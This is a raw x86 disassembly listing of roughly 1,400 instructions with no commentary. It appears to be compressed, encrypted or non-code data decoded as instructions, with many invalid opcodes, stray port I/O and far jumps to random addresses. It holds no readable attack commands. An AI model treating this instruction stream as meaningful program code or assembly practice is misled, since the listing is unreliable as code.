  41a7d7:	mov    al,ds:0x1eab3258
  41a7dc:	push   ds
  41a7dd:	fbstp  TBYTE PTR [edx+edi*2-0xb1dc42]
  41a7e4:	in     eax,dx
  41a7e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7e6:	clc    
  41a7e7:	dec    edi
  41a7e8:	cmp    ah,BYTE PTR [eax+eax*2+0x5705e5cf]
  41a7ef:	das    
  41a7f0:	arpl   ax,dx
  41a7f2:	jb     0x41a7f0
  41a7f4:	or     DWORD PTR [esi+0x28a9ce0a],edi
  41a7fa:	inc    edi
  41a7fb:	repz add DWORD PTR ds:[edx+edi*4+0x3c],ebp
  41a801:	dec    ecx
  41a802:	out    dx,al
  41a803:	mov    edx,esi
  41a805:	mov    ebx,0xa907e378
  41a80a:	cld    
  41a80b:	xor    bl,BYTE PTR [ebx+0x39]
  41a80e:	sub    al,0x84
  41a810:	sub    al,0xbb
  41a812:	or     DWORD PTR [ebp+0x3637b788],ebp
  41a818:	jb     0x41a7c5
  41a81a:	retf   0x808d
  41a81d:	xchg   ah,bl
  41a81f:	xchg   DWORD PTR [edi+0x5a],esp
  41a822:	sbb    BYTE PTR [edx-0x6c],cl
  41a825:	and    al,0x8
  41a827:	or     al,0x49
  41a829:	adc    DWORD PTR [edi-0x3032b7cf],eax
  41a82f:	ret    
  41a830:	pop    edx
  41a831:	mov    ds:0xc3c4abe8,eax
  41a836:	das    
  41a837:	mov    dh,0xb8
  41a839:	pop    es
  41a83a:	mov    cl,0xc6
  41a83c:	xchg   esp,eax
  41a83d:	inc    esi
  41a83e:	push   eax
  41a83f:	jo     0x41a7c7
  41a841:	outs   dx,DWORD PTR ds:[esi]
  41a842:	xchg   BYTE PTR [ecx],cl
  41a844:	out    0xb8,eax
  41a846:	add    esi,DWORD PTR [ebp+0x3e]
  41a849:	test   ebx,eax
  41a84b:	std    
  41a84c:	xchg   ebx,eax
  41a84d:	add    DWORD PTR [esi+edx*4],eax
  41a850:	shl    DWORD PTR [eax],1
  41a852:	adc    al,BYTE PTR [edx+0x35]
  41a855:	adc    BYTE PTR [esi-0x16],0x82
  41a859:	mov    ds:0x968c631,eax
  41a85e:	sti    
  41a85f:	(bad)  
  41a860:	sub    DWORD PTR [edi],esi
  41a862:	sub    ah,BYTE PTR [edi+0xa]
  41a865:	xor    dl,BYTE PTR [esi-0xe]
  41a868:	aad    0x11
  41a86a:	imul   edx,DWORD PTR [di],0xfe574e80
  41a871:	aas    
  41a872:	out    dx,al
  41a873:	or     DWORD PTR [ecx],0xffffffe6
  41a876:	das    
  41a877:	xchg   esp,eax
  41a878:	push   ds
  41a879:	sbb    ebp,edi
  41a87b:	xchg   esi,eax
  41a87c:	mov    ds:0x4f798a60,al
  41a881:	jge    0x41a8b5
  41a883:	cwde   
  41a884:	aaa    
  41a885:	outs   dx,BYTE PTR ds:[esi]
  41a886:	sub    BYTE PTR ds:[edx-0x5],cl
  41a88a:	loop   0x41a89c
  41a88c:	pusha  
  41a88d:	adc    eax,0xf08c7b21
  41a892:	sbb    BYTE PTR [esi+0x74f85137],bl
  41a898:	xchg   edi,eax
  41a899:	xor    DWORD PTR [edi],ebx
  41a89b:	lock repz addr16 sbb al,0xac
  41a8a0:	add    BYTE PTR [esi-0x37efe26d],0x79
  41a8a7:	leave  
  41a8a8:	mov    ah,BYTE PTR [ecx-0x63]
  41a8ab:	or     DWORD PTR [ecx-0x206fa407],ecx
  41a8b1:	and    DWORD PTR [eax-0x5a],eax
  41a8b4:	out    0x2b,al
  41a8b6:	or     BYTE PTR [esi+edi*8-0x71],al
  41a8ba:	sbb    DWORD PTR [eax],esi
  41a8bc:	call   0xadd2:0xc9e123ce
  41a8c3:	scas   eax,DWORD PTR es:[edi]
  41a8c4:	add    eax,0x972e403f
  41a8c9:	push   esp
  41a8ca:	mov    bl,BYTE PTR [eax-0x29]
  41a8cd:	sbb    eax,DWORD PTR [edx-0x3959153f]
  41a8d3:	inc    eax
  41a8d4:	mov    edi,0x39d4fa25
  41a8d9:	xor    DWORD PTR [ecx],edx
  41a8db:	mov    bl,0x25
  41a8dd:	push   ds
  41a8de:	in     eax,dx
  41a8df:	fist   WORD PTR [ecx]
  41a8e1:	nop
  41a8e2:	fcom   DWORD PTR [ecx+0x61faab03]
  41a8e8:	cmp    al,0x6a
  41a8ea:	ss mov esi,0x9ca13ddb
  41a8f0:	xor    eax,0x4f9c9997
  41a8f5:	mov    al,ds:0x961d549f
  41a8fa:	je     0x41a900
  41a8fc:	pop    ds
  41a8fd:	adc    edx,esp
  41a8ff:	test   BYTE PTR [ebx-0x63],0x69
  41a903:	cmp    DWORD PTR [edi+0x4181d3c9],esp
  41a909:	inc    eax
  41a90a:	dec    esi
  41a90b:	js     0x41a98a
  41a90d:	dec    ebx
  41a90e:	icebp  
  41a90f:	jg     0x41a918
  41a911:	cmp    esp,edi
  41a913:	cmp    DWORD PTR [esi+0x268708cf],edi
  41a919:	pop    ebx
  41a91a:	shl    BYTE PTR [ebx+edi*8+0x21c89ad8],cl
  41a921:	inc    esi
  41a922:	jbe    0x41a8ea
  41a924:	fcmovbe st,st(0)
  41a926:	pop    eax
  41a927:	clc    
  41a928:	inc    edx
  41a929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a92a:	es sti 
  41a92c:	mov    cl,BYTE PTR [ebp-0x5e]
  41a92f:	add    DWORD PTR [edi-0x5f],ebx
  41a932:	aam    0xb2
  41a934:	sbb    esi,DWORD PTR [eax]
  41a936:	xor    bl,bl
  41a938:	pop    edx
  41a939:	rcr    bh,0xea
  41a93c:	or     eax,0xf9c518ff
  41a941:	xchg   esp,eax
  41a942:	mov    ah,0xb
  41a944:	ins    DWORD PTR es:[edi],dx
  41a945:	add    cl,ch
  41a947:	push   eax
  41a948:	ja     0x41a950
  41a94a:	push   ss
  41a94b:	ins    BYTE PTR es:[edi],dx
  41a94c:	dec    esi
  41a94d:	dec    esi
  41a94e:	test   al,0x15
  41a950:	mov    al,0x55
  41a952:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a953:	push   ebp
  41a954:	shr    ch,0x74
  41a957:	ret    
  41a958:	cmp    al,0x23
  41a95a:	retf   
  41a95b:	repz push eax
  41a95d:	inc    ebx
  41a95e:	daa    
  41a95f:	pop    ss
  41a960:	and    eax,0xd03c8ffa
  41a965:	shl    esi,1
  41a967:	test   eax,0x380acc8a
  41a96c:	dec    esp
  41a96d:	fsub   DWORD PTR [ebx+0x3682d44d]
  41a973:	add    ah,BYTE PTR [edi-0x516e6799]
  41a979:	or     ch,BYTE PTR [edi+0x7c]
  41a97c:	aaa    
  41a97d:	cmp    BYTE PTR [eax],ah
  41a97f:	cdq    
  41a980:	xlat   BYTE PTR ds:[ebx]
  41a981:	je     0x41a9ca
  41a983:	sbb    al,0x17
  41a985:	mov    edx,0x9eec22cc
  41a98a:	or     BYTE PTR [esp+ecx*2-0x71],cl
  41a98e:	ror    BYTE PTR [esi-0x67],cl
  41a991:	jb     0x41a91d
  41a993:	xchg   ebx,eax
  41a994:	daa    
  41a995:	sbb    al,0x79
  41a997:	jo     0x41a91f
  41a999:	push   ebp
  41a99a:	cdq    
  41a99b:	or     al,0xff
  41a99d:	in     al,0x3a
  41a99f:	ret    0x8179
  41a9a2:	pop    ebx
  41a9a3:	bound  edi,QWORD PTR [ebp+0x4768617b]
  41a9a9:	jo     0x41a94b
  41a9ab:	stos   WORD PTR es:[edi],ax
  41a9ad:	mov    edi,0xe8bba373
  41a9b2:	popa   
  41a9b3:	test   BYTE PTR [ecx+0x6167d58a],0xbe
  41a9ba:	test   DWORD PTR [ebx-0x40],0xaf7db668
  41a9c1:	add    DWORD PTR [esi-0x7f89be25],esp
  41a9c7:	jne    0x41a9f1
  41a9c9:	lock mov ds:0x5ceec91d,eax
  41a9cf:	add    eax,edi
  41a9d1:	js     0x41aa04
  41a9d3:	pusha  
  41a9d4:	stos   DWORD PTR es:[edi],eax
  41a9d5:	xchg   edi,eax
  41a9d6:	shl    BYTE PTR [esi],cl
  41a9d8:	jb     0x41aa12
  41a9da:	cmp    cl,al
  41a9dc:	hlt    
  41a9dd:	gs sub eax,0xfead1e5f
  41a9e3:	jno    0x41aa19
  41a9e5:	pushf  
  41a9e6:	out    dx,al
  41a9e7:	pop    esi
  41a9e8:	mov    eax,ds:0xf622b9d1
  41a9ed:	aam    0xbc
  41a9ef:	lds    edx,FWORD PTR [edi-0xa]
  41a9f2:	call   0xe72d:0x7290bb03
  41a9f9:	test   eax,0x55d11116
  41a9fe:	jae    0x41a991
  41aa00:	in     eax,0xfe
  41aa02:	in     eax,0x29
  41aa04:	add    eax,0xddb28586
  41aa09:	sbb    bl,ah
  41aa0b:	mov    edi,ecx
  41aa0d:	ss xchg ebx,eax
  41aa0f:	sub    BYTE PTR [edx+0x67],bl
  41aa12:	cmc    
  41aa13:	push   ebp
  41aa14:	pop    ds
  41aa15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa16:	add    DWORD PTR [ebx-0x64b3935],esi
  41aa1c:	in     eax,0xb6
  41aa1e:	addr16 inc ebx
  41aa20:	pop    ds
  41aa21:	xchg   BYTE PTR [ebp-0x53d64fb7],bl
  41aa27:	mov    ?,WORD PTR [ecx+0x3d]
  41aa2a:	mov    ebx,0xc5171061
  41aa2f:	jge    0x41a9ea
  41aa31:	push   0x11ab47f4
  41aa36:	inc    edx
  41aa37:	scas   al,BYTE PTR es:[edi]
  41aa38:	aaa    
  41aa39:	ds js  0x41a9ce
  41aa3c:	aam    0x93
  41aa3e:	jmp    0x41aa9f
  41aa40:	sbb    cl,BYTE PTR [esi]
  41aa42:	hlt    
  41aa43:	out    0xd1,al
  41aa45:	dec    ebp
  41aa46:	jp     0x41aa6b
  41aa48:	push   esi
  41aa49:	and    DWORD PTR [ecx+0x1b07eb14],esi
  41aa4f:	sbb    dh,BYTE PTR [edx-0x23]
  41aa52:	gs xcrypt-cfb (bad)
  41aa54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa56:	mov    eax,0x3afc8c14
  41aa5b:	gs add eax,0x305980b7
  41aa61:	mov    esi,0xafb1f9c5
  41aa66:	out    0x58,eax
  41aa68:	dec    ebx
  41aa69:	jns    0x41aa75
  41aa6b:	xchg   ecx,eax
  41aa6c:	scas   eax,DWORD PTR es:[edi]
  41aa6d:	cmc    
  41aa6e:	ds aad 0x7f
  41aa71:	pop    edi
  41aa72:	pop    edx
  41aa73:	xor    al,0xe
  41aa75:	sti    
  41aa76:	adc    al,BYTE PTR [ebx+0x2c]
  41aa79:	push   edi
  41aa7a:	(bad)  
  41aa7b:	xlat   BYTE PTR ds:[ebx]
  41aa7c:	mov    ds:0xee22167c,al
  41aa81:	in     al,dx
  41aa82:	addr16 loopne 0x41aaf5
  41aa85:	fld    QWORD PTR cs:[ebx+0x1b]
  41aa89:	jae    0x41aa22
  41aa8b:	and    ebp,eax
  41aa8d:	push   esp
  41aa8e:	cmp    DWORD PTR [ebx-0x6a],eax
  41aa91:	sub    eax,0x35c8ce20
  41aa96:	xchg   BYTE PTR [ebp-0x446fc591],bh
  41aa9c:	adc    dh,BYTE PTR [edi+0x23]
  41aa9f:	add    edx,DWORD PTR [ecx+ecx*2]
  41aaa2:	test   DWORD PTR [ecx],esi
  41aaa4:	xlat   BYTE PTR ds:[ebx]
  41aaa5:	push   cs
  41aaa6:	loopne 0x41aa48
  41aaa8:	mov    ds:0x58c525e8,al
  41aaad:	mov    dl,0xaa
  41aaaf:	shr    DWORD PTR [ecx+0x73],0x83
  41aab3:	adc    DWORD PTR [ecx-0x72],ebx
  41aab6:	test   BYTE PTR [edx],ch
  41aab8:	mov    DWORD PTR [eax+0x7b],edi
  41aabb:	pop    ds
  41aabc:	mov    ebp,0xaab3eddc
  41aac1:	add    BYTE PTR [edi],cl
  41aac3:	fstp   DWORD PTR [ebp+0x40]
  41aac6:	test   eax,0x2245b0db
  41aacb:	loop   0x41aa5b
  41aacd:	fistp  DWORD PTR [ecx-0x1d392582]
  41aad3:	sti    
  41aad4:	aad    0xfe
  41aad6:	adc    ebx,esi
  41aad8:	not    DWORD PTR [ebx+0x60096123]
  41aade:	push   cs
  41aadf:	dec    esi
  41aae0:	sub    eax,0x2a5ddb9f
  41aae5:	xor    al,0xc2
  41aae7:	arpl   di,bx
  41aae9:	mov    ds:0x1c662609,al
  41aaee:	retf   
  41aaef:	lods   eax,DWORD PTR ds:[esi]
  41aaf0:	ret    
  41aaf1:	cs scas al,BYTE PTR es:[edi]
  41aaf3:	push   ebx
  41aaf4:	fild   DWORD PTR [eax+0x29b969aa]
  41aafa:	pop    ebp
  41aafb:	popa   
  41aafc:	add    al,0x53
  41aafe:	jle    0x41aa9f
  41ab00:	das    
  41ab01:	sbb    BYTE PTR [edx-0x67],ah
  41ab04:	mov    bh,BYTE PTR [esp+edx*1+0x3811016c]
  41ab0b:	imul   dx,WORD PTR [edx-0x18],0xff85
  41ab10:	(bad)  
  41ab11:	retf   
  41ab12:	mov    DWORD PTR [esi+0x6c],esp
  41ab15:	adc    edi,DWORD PTR [ebp+0xc8430d8]
  41ab1b:	xchg   edx,eax
  41ab1c:	cwde   
  41ab1d:	shl    edi,1
  41ab1f:	sbb    DWORD PTR [eax],0xffffffb9
  41ab22:	push   ss
  41ab23:	mov    dh,0x19
  41ab25:	mov    bh,0x46
  41ab27:	lock std 
  41ab29:	hlt    
  41ab2a:	cmp    ah,BYTE PTR [edi-0x74]
  41ab2d:	fs loop 0x41ab09
  41ab30:	xchg   esp,eax
  41ab31:	mov    ds:0x2cf86cb0,al
  41ab36:	add    eax,0xaa85a206
  41ab3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab3c:	mov    ch,0x4e
  41ab3e:	mov    BYTE PTR [edx+0x4033c63b],al
  41ab44:	punpckhwd mm0,mm7
  41ab47:	(bad)  
  41ab48:	sub    DWORD PTR [ebx],ecx
  41ab4a:	sub    esi,DWORD PTR [edi]
  41ab4c:	in     eax,dx
  41ab4d:	(bad)  
  41ab4e:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41ab50:	jb     0x41aaed
  41ab52:	xlat   BYTE PTR ds:[ebx]
  41ab53:	fwait
  41ab54:	cli    
  41ab55:	popf   
  41ab56:	sbb    DWORD PTR [esi],edi
  41ab58:	in     al,dx
  41ab59:	lods   eax,DWORD PTR ds:[esi]
  41ab5a:	mov    eax,0x57309e6
  41ab5f:	jl     0x41ab00
  41ab61:	jmp    0xbc60:0x43df526e
  41ab68:	mov    ah,0x9f
  41ab6a:	pop    es
  41ab6b:	xchg   edx,eax
  41ab6c:	pop    esi
  41ab6d:	inc    esi
  41ab6e:	ffreep st(2)
  41ab70:	or     DWORD PTR gs:[ebx-0x223aaae7],esi
  41ab77:	pop    ebp
  41ab78:	pop    ebp
  41ab79:	imul   esp,esi,0x1f
  41ab7c:	ss adc cl,0xaf
  41ab80:	das    
  41ab81:	sub    esp,DWORD PTR [ebp-0x4bda496]
  41ab87:	(bad)  [ecx+0x582ce352]
  41ab8d:	(bad)  
  41ab8e:	mov    dh,BYTE PTR [ecx-0x71]
  41ab91:	or     al,0xee
  41ab93:	jle    0x41ab9c
  41ab95:	mov    ds:0xf025397e,eax
  41ab9a:	push   0x500cd230
  41ab9f:	dec    ebx
  41aba0:	inc    ecx
  41aba1:	(bad)  [esi-0x3c]
  41aba4:	adc    edi,DWORD PTR [edi+0x166c1e56]
  41abaa:	cli    
  41abab:	inc    ecx
  41abac:	mov    ah,cl
  41abae:	sbb    eax,DWORD PTR [eax+eiz*8+0x79759874]
  41abb5:	and    DWORD PTR [ebp-0x75],ebp
  41abb8:	xchg   DWORD PTR [edi-0x5e],esi
  41abbb:	inc    ebx
  41abbc:	dec    ecx
  41abbd:	mov    ebp,0x2258f922
  41abc2:	in     eax,dx
  41abc3:	fwait
  41abc4:	ds aad 0x18
  41abc7:	add    al,0x88
  41abc9:	xor    eax,0x2bb7ab65
  41abce:	adc    DWORD PTR [eax],edi
  41abd0:	mov    eax,ds:0xe1882e65
  41abd5:	and    bl,BYTE PTR [esp+eax*1-0x68]
  41abd9:	je     0x41ac1e
  41abdb:	mov    edx,0x78f85ae2
  41abe0:	sub    BYTE PTR [edx+0x3b],0x12
  41abe4:	jge    0x41abca
  41abe6:	ror    DWORD PTR [esp+ecx*2+0x6df628b6],1
  41abed:	jmp    0xa7b3:0x801138a0
  41abf4:	xlat   BYTE PTR ds:[ebx]
  41abf5:	enter  0xbe70,0xac
  41abf9:	shl    bl,cl
  41abfb:	push   ss
  41abfc:	pusha  
  41abfd:	lahf   
  41abfe:	inc    ecx
  41abff:	fcom   st(7)
  41ac01:	pop    ss
  41ac02:	cmp    DWORD PTR [ebp+0x68],ebp
  41ac05:	cs pop esi
  41ac07:	shr    BYTE PTR [ecx-0x61],1
  41ac0a:	pop    esi
  41ac0b:	iret   
  41ac0c:	das    
  41ac0d:	lea    edx,[ebx]
  41ac0f:	ret    
  41ac10:	dec    edx
  41ac11:	int    0x30
  41ac13:	test   DWORD PTR [edi-0x532d8e67],ecx
  41ac19:	pusha  
  41ac1a:	aaa    
  41ac1b:	xchg   esp,eax
  41ac1c:	or     DWORD PTR gs:[edx+0x2c],edi
  41ac20:	pop    ss
  41ac21:	imul   eax,DWORD PTR [esp+ecx*1-0x9],0x33
  41ac26:	mov    dh,0xfe
  41ac28:	repnz adc al,0x77
  41ac2b:	inc    edi
  41ac2c:	in     eax,dx
  41ac2d:	retf   0xd0a6
  41ac30:	das    
  41ac31:	in     eax,dx
  41ac32:	ret    0x2b36
  41ac35:	lods   eax,DWORD PTR ds:[esi]
  41ac36:	popf   
  41ac37:	sub    edx,DWORD PTR [ecx-0x37]
  41ac3a:	pop    edi
  41ac3b:	inc    edi
  41ac3c:	add    DWORD PTR [esi+0x7d],eax
  41ac3f:	lods   al,BYTE PTR ds:[esi]
  41ac40:	popf   
  41ac41:	push   ebx
  41ac42:	pusha  
  41ac43:	retf   0x188c
  41ac46:	ror    BYTE PTR [edx+edx*2+0x3e2524d6],cl
  41ac4d:	xor    al,0x23
  41ac4f:	hlt    
  41ac50:	icebp  
  41ac51:	bound  ecx,QWORD PTR [ebx+0x1e]
  41ac54:	scas   al,BYTE PTR es:[edi]
  41ac55:	imul   ebx,DWORD PTR [ecx-0xddaa6f1],0x7dac188c
  41ac5f:	call   0xf17ce23e
  41ac64:	push   0x11
  41ac66:	ror    BYTE PTR ds:0xb6e5c78f,cl
  41ac6c:	sbb    eax,0x258858dd
  41ac71:	(bad)  
  41ac72:	hlt    
  41ac73:	sbb    al,0xde
  41ac75:	and    edi,DWORD PTR [ebp+0x68]
  41ac78:	mov    cl,0x8
  41ac7a:	mov    dl,0x4c
  41ac7c:	dec    esi
  41ac7d:	call   0xf2d64f04
  41ac82:	pusha  
  41ac83:	pusha  
  41ac84:	movnti DWORD PTR [edx],eax
  41ac87:	enter  0x3f8b,0xc3
  41ac8b:	mov    eax,ds:0xcde1db5d
  41ac90:	push   0x22844af9
  41ac95:	out    0xa7,eax
  41ac97:	sub    ah,BYTE PTR [ecx+0x7c887a45]
  41ac9d:	or     al,0xcb
  41ac9f:	bound  edi,QWORD PTR [ebx+0x1e]
  41aca2:	pop    ss
  41aca3:	sub    ebp,ecx
  41aca5:	call   0xa5008fb8
  41acaa:	leave  
  41acab:	or     dh,BYTE PTR [esi]
  41acad:	js     0x41ad11
  41acaf:	out    dx,al
  41acb0:	mov    eax,ds:0x447073a6
  41acb5:	outs   dx,BYTE PTR ds:[esi]
  41acb6:	ror    BYTE PTR [eax+eiz*2],1
  41acb9:	gs ja  0x41ac5c
  41acbc:	in     eax,dx
  41acbd:	sahf   
  41acbe:	cmp    BYTE PTR [edx],cl
  41acc0:	cwde   
  41acc1:	jl     0x41ad3f
  41acc3:	pop    esp
  41acc4:	cwde   
  41acc5:	repz mov ah,0x7c
  41acc8:	cli    
  41acc9:	icebp  
  41acca:	out    0x37,al
  41accc:	mov    ecx,0x3a8fe5d9
  41acd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acd2:	int3   
  41acd3:	push   edi
  41acd4:	dec    ecx
  41acd5:	nop
  41acd6:	xor    bh,0x14
  41acd9:	js     0x41acf6
  41acdb:	repz mov dl,0xc2
  41acde:	loop   0x41ad47
  41ace0:	push   es
  41ace1:	jmp    FWORD PTR [esp+ebx*2-0xdf3d3b9]
  41ace8:	add    eax,0x66b5be76
  41aced:	in     eax,dx
  41acee:	addr16 inc esp
  41acf0:	int3   
  41acf1:	cmp    BYTE PTR [edx+edi*4],ah
  41acf4:	popf   
  41acf5:	mov    dl,0x20
  41acf7:	xchg   esi,eax
  41acf8:	shl    edx,0x88
  41acfb:	pop    es
  41acfc:	inc    edi
  41acfd:	rcr    dl,0xac
  41ad00:	jmp    0x4de2:0x5e75923e
  41ad07:	jp     0x41ad30
  41ad09:	dec    edx
  41ad0a:	xchg   edx,eax
  41ad0b:	push   cs
  41ad0c:	icebp  
  41ad0d:	in     al,0x2c
  41ad0f:	push   0x9ea43125
  41ad14:	test   DWORD PTR [esp+edx*8+0x43],edi
  41ad18:	sbb    eax,0x895894a1
  41ad1d:	pop    es
  41ad1e:	clc    
  41ad1f:	in     al,dx
  41ad20:	xchg   BYTE PTR ds:0x211ea3d7,bl
  41ad26:	or     BYTE PTR [eax-0x34],dh
  41ad29:	call   0x3d19:0x949c9642
  41ad30:	xchg   esi,eax
  41ad31:	mov    ds:0xfea838b3,al
  41ad36:	or     DWORD PTR [edx+ecx*1],ebp
  41ad39:	gs mov ah,0xc1
  41ad3d:	cdq    
  41ad3e:	cld    
  41ad3f:	adc    BYTE PTR [edx],al
  41ad41:	out    0x80,eax
  41ad43:	push   0xe5c99508
  41ad48:	xchg   ebp,eax
  41ad49:	xchg   ecx,eax
  41ad4a:	mov    DWORD PTR [eax-0x7d],0x4122dd9d
  41ad51:	inc    ebx
  41ad52:	fidivr WORD PTR [edx-0x66]
  41ad55:	xchg   esi,eax
  41ad56:	out    0x76,eax
  41ad58:	mov    es,WORD PTR [eax+0x40]
  41ad5b:	sbb    dh,BYTE PTR [esi+edi*1+0x53]
  41ad5f:	stc    
  41ad60:	outs   dx,BYTE PTR ds:[esi]
  41ad61:	jb     0x41acfe
  41ad63:	out    0x26,al
  41ad65:	sub    BYTE PTR [esp+eax*2+0x692dac23],dl
  41ad6c:	popa   
  41ad6d:	rcr    DWORD PTR [edi-0x2d],1
  41ad70:	mov    ?,WORD PTR [ebp-0x11]
  41ad73:	cmp    ch,ah
  41ad75:	icebp  
  41ad76:	arpl   WORD PTR [ebp+0x73623a94],di
  41ad7c:	rol    BYTE PTR [edx+edx*1-0x49b07cae],0x8b
  41ad84:	pop    edi
  41ad85:	adc    BYTE PTR [ebx-0x55],ah
  41ad88:	jmp    0x96ba:0x9ca70037
  41ad8f:	cli    
  41ad90:	pop    ss
  41ad91:	cmp    al,BYTE PTR [edx-0x73f992cc]
  41ad97:	(bad)  
  41ad98:	pusha  
  41ad99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad9b:	pop    ds
  41ad9c:	mov    edi,DWORD PTR [ecx+0x13]
  41ad9f:	sub    eax,0x51da3d3
  41ada4:	push   ds
  41ada5:	xor    BYTE PTR [edx-0x4c87a37f],cl
  41adab:	(bad)  
  41adac:	idiv   DWORD PTR [eax]
  41adae:	jns    0x41ae13
  41adb0:	push   ecx
  41adb1:	or     eax,0xde3b4db8
  41adb6:	mov    al,es:0xba9db017
  41adbc:	dec    ebp
  41adbd:	push   ss
  41adbe:	arpl   WORD PTR ds:0x32a680fb,si
  41adc4:	lock jno 0x41ae32
  41adc7:	fisub  DWORD PTR [ecx]
  41adc9:	stos   BYTE PTR es:[edi],al
  41adca:	dec    eax
  41adcc:	scas   al,BYTE PTR es:[edi]
  41adcd:	sbb    BYTE PTR [ebp-0x73],0x7e
  41add1:	jae    0x41ad5d
  41add3:	mov    esi,0x42055ad4
  41add8:	loope  0x41ae02
  41adda:	push   ebp
  41addb:	xchg   ebx,eax
  41addc:	stos   DWORD PTR es:[edi],eax
  41addd:	adc    eax,DWORD PTR [ebx-0x22]
  41ade0:	mov    DWORD PTR [edx-0x6db5b149],ebp
  41ade6:	nop
  41ade7:	mov    esp,ebx
  41ade9:	sbb    al,0xb6
  41adeb:	jnp    0x41adda
  41aded:	call   0x408376d9
  41adf2:	mov    eax,ds:0x92d20d6b
  41adf7:	out    dx,al
  41adf8:	push   0xfffffff2
  41adfa:	and    al,0x28
  41adfc:	rol    ecx,cl
  41adfe:	inc    esi
  41adff:	xchg   edx,eax
  41ae00:	adc    al,0x54
  41ae02:	jo     0x41adae
  41ae04:	mov    al,ds:0x249f966d
  41ae09:	call   0x232c:0x9397e8de
  41ae10:	and    eax,0x120f2188
  41ae15:	je     0x41ae1d
  41ae17:	inc    ebp
  41ae18:	mov    eax,0xd84e8e21
  41ae1d:	fsub   DWORD PTR [ebx+eax*1-0x65d3405f]
  41ae24:	pop    ebx
  41ae25:	fdivr  QWORD PTR [esi-0x347dbe29]
  41ae2b:	jecxz  0x41aea3
  41ae2d:	std    
  41ae2e:	mov    ch,0x97
  41ae30:	cmp    BYTE PTR [esi],bh
  41ae32:	leave  
  41ae33:	stos   DWORD PTR es:[edi],eax
  41ae34:	imul   ebx,DWORD PTR [edi-0x72],0xe10499a4
  41ae3b:	push   es
  41ae3c:	inc    ebx
  41ae3d:	push   ebx
  41ae3e:	ins    BYTE PTR es:[edi],dx
  41ae3f:	sbb    BYTE PTR [edi-0x1b],dl
  41ae42:	(bad)  
  41ae43:	pop    ecx
  41ae44:	div    edx
  41ae46:	in     al,0x53
  41ae48:	dec    ecx
  41ae49:	mov    fs,ebp
  41ae4b:	outs   dx,BYTE PTR ds:[esi]
  41ae4c:	sub    eax,DWORD PTR [edi]
  41ae4e:	loope  0x41ae10
  41ae50:	ret    0x707b
  41ae53:	and    BYTE PTR [eax-0x4c],al
  41ae56:	cld    
  41ae57:	mov    eax,0x5dd26978
  41ae5c:	popf   
  41ae5d:	sub    al,0xce
  41ae5f:	rcr    ebx,0x61
  41ae62:	mov    edi,0x4ef4d2d6
  41ae67:	cwde   
  41ae68:	test   al,0xb
  41ae6a:	call   0x98f01522
  41ae6f:	inc    BYTE PTR [ebp-0xb66acb3]
  41ae75:	lods   al,BYTE PTR ds:[esi]
  41ae76:	push   edi
  41ae77:	dec    esi
  41ae78:	mov    edx,0xc036b139
  41ae7d:	xor    al,0xa1
  41ae7f:	jb     0x41ae7c
  41ae81:	out    dx,al
  41ae82:	push   esp
  41ae83:	loopne 0x41ae82
  41ae85:	adc    dh,BYTE PTR [edx-0x4a]
  41ae88:	loope  0x41aec8
  41ae8a:	hlt    
  41ae8b:	xchg   esi,eax
  41ae8c:	fwait
  41ae8d:	xchg   ebx,eax
  41ae8e:	xchg   edi,eax
  41ae8f:	in     al,0xd4
  41ae91:	jno    0x41ae40
  41ae93:	or     BYTE PTR [edx],0xf8
  41ae96:	jo     0x41ae7f
  41ae98:	lods   al,BYTE PTR ds:[esi]
  41ae99:	shl    DWORD PTR [esi+0x56],cl
  41ae9c:	xor    al,0xd6
  41ae9e:	xor    edx,DWORD PTR [edi]
  41aea0:	cmp    al,BYTE PTR [eax-0x41]
  41aea3:	daa    
  41aea4:	sub    eax,0x1acc9ef0
  41aea9:	inc    edi
  41aeaa:	adc    eax,0x96e3ec36
  41aeaf:	mov    es,WORD PTR [eax]
  41aeb1:	xor    al,0x1
  41aeb3:	xor    bl,BYTE PTR [edx]
  41aeb5:	fcomp  DWORD PTR [edi-0x55]
  41aeb8:	xchg   edx,eax
  41aeb9:	jmp    0x9a4e:0x9ef7a4bb
  41aec0:	push   ss
  41aec1:	shl    BYTE PTR [edx],1
  41aec3:	leave  
  41aec4:	call   0x6e527419
  41aec9:	loope  0x41aebb
  41aecb:	pushf  
  41aecc:	push   edi
  41aecd:	adc    DWORD PTR [ebp+0x58],0xf8714c1b
  41aed4:	pop    edi
  41aed5:	sti    
  41aed6:	push   esp
  41aed7:	pop    esi
  41aed8:	(bad)  
  41aed9:	dec    BYTE PTR [eax-0x7e]
  41aedc:	scas   eax,DWORD PTR es:[edi]
  41aedd:	mov    edi,0xb841f4c5
  41aee2:	lods   al,BYTE PTR ds:[esi]
  41aee3:	fisttp DWORD PTR [edi+0x1c]
  41aee6:	arpl   WORD PTR [eax-0x34a898df],dx
  41aeec:	pop    esi
  41aeed:	in     al,dx
  41aeee:	and    al,0x77
  41aef0:	mov    ah,0x73
  41aef2:	xor    al,0xc2
  41aef4:	es xchg esi,eax
  41aef6:	imul   DWORD PTR [esi]
  41aef8:	mov    ?,WORD PTR [si-0x5331]
  41aefd:	push   es
  41aefe:	scas   eax,DWORD PTR es:[edi]
  41aeff:	(bad)  
  41af01:	xchg   ecx,eax
  41af02:	cwde   
  41af03:	and    DWORD PTR [edx+0x6bfade01],edi
  41af09:	lods   eax,DWORD PTR ds:[esi]
  41af0a:	adc    BYTE PTR [edi],cl
  41af0c:	xchg   BYTE PTR [ecx+0x6348e70a],dl
  41af12:	or     al,0xad
  41af14:	sub    cl,BYTE PTR [ecx+0x42]
  41af17:	fsub   QWORD PTR [ebx+edi*1]
  41af1a:	mov    edx,0xb1d8c897
  41af1f:	shl    BYTE PTR [edi-0x722a5a32],0xbc
  41af26:	pop    es
  41af27:	out    dx,al
  41af28:	push   es
  41af29:	in     al,dx
